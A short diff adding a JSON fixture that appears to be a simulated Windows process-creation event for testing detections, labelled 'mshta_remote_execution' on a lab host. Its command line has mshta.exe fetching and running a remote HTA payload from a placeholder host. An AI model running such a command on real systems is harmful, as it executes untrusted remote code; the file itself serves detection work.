@@ -1,0 +1,11 @@
+{
+  "event_type": "process_creation",
+  "platform": "windows",
+  "process": {
+    "name": "mshta.exe",
+    "command_line": "mshta.exe https://example.invalid/payload.hta"
+  },
+  "user": "lab-user",
+  "host": "lab-windows",
+  "simulation": "mshta_remote_execution"
+}
